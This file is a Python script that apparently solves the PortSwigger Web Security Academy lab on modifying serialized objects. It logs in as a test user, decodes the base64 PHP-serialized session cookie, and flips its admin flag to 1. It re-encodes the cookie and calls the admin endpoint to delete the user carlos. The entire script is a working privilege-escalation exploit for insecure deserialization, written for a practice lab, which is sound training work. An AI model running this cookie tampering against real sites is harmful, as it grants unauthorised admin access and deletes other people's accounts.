#!/usr/bin/env python3
# Modifying serialized objects
# Lab-Link: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects
# Difficulty: APPRENTICE
import base64
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def login(client, host, username, password):
    url = f'{host}/login'
    data = {'username': username,
            'password': password}
    res = client.post(url, data=data)
    return f'Your username is: {username}' in res.text


def manipulate_cookie_value(cookie):
    # Remove URL encoding, b64 decode the result and decode from byte to string
    decoded = base64.b64decode(requests.utils.unquote(cookie)).decode()
    print(f'[ ] Original cookie content: {decoded}')

    new_value = decoded[:-3] + '1;}'
    print(f'[ ] New cookie content: {new_value}')
    # Encode new cookie value from string to byte, B64 encode and URL encode the result
    encoded = requests.utils.quote(base64.b64encode(new_value.encode()))
    return encoded


def delete_user(client, host, user):
    url = f'{host}/admin/delete?username={user}'
    r = client.get(url)
    return 'User deleted successfully!' in r.text


def main():
    print('[+] Modifying serialized objects')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    with requests.Session() as client:
        client.verify = False
        client.proxies = proxies

        if not login(client, host, 'wiener', 'peter'):
            print(f'[-] Failed to log in as wiener')
            sys.exit(-2)
        print(f'[+] Log in as wiener successful')

        cookie_value = manipulate_cookie_value(client.cookies.get('session'))
        if not cookie_value:
            print(f'[-] Failed to find or manipulate cookie value')
            sys.exit(-3)
        client.cookies.set('session', cookie_value, domain=f'{host[8:]}')
        print(f'[+] Manipulation of cookie value successful')

        if not delete_user(client, host, 'carlos'):
            print(f'[-] Failed to delete user carlos')
            sys.exit(-4)
        print(f'[+] Deletion of carlos appears successful')

        # I had some times issues getting the proper result, so wait briefly before checking
        time.sleep(2)
        if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
            print(f'[-] Failed to solve lab')
            sys.exit(-9)

        print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
